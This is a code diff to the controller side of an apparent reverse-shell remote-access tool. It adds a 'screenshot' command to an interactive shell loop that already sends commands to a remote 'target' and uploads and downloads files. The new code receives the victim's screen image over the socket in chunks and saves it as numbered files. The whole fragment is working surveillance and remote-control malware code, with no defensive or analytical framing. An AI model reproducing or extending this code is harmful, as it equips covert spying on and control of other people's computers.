@@ -41,6 +41,7 @@ def download_file(file_name):
     f.close()
 
 def target_communication():
+    count = 0
     while True:
         command = input(colored(f'* shell~{ip}: ', 'red'))
         reliable_send(command)
@@ -54,6 +55,19 @@ def target_communication():
             upload_file(command[7:])
         elif command[:8] == 'download':
             download_file(command[9:])
+        elif command[:10] == 'screenshot':
+            f = open('screenshot%d' %(count), 'wb')
+            target.settimeout(3)
+            chunk = target.recv(1024)
+            while chunk:
+                f.write(chunk)
+                try:
+                    chunk = target.recv(1024)
+                except socket.timeout as e:
+                    break
+            target.settimeout(None)
+            f.close()
+            count += 1
         elif command == 'help':
             print(colored(''' \n
             exit                                 --> exit
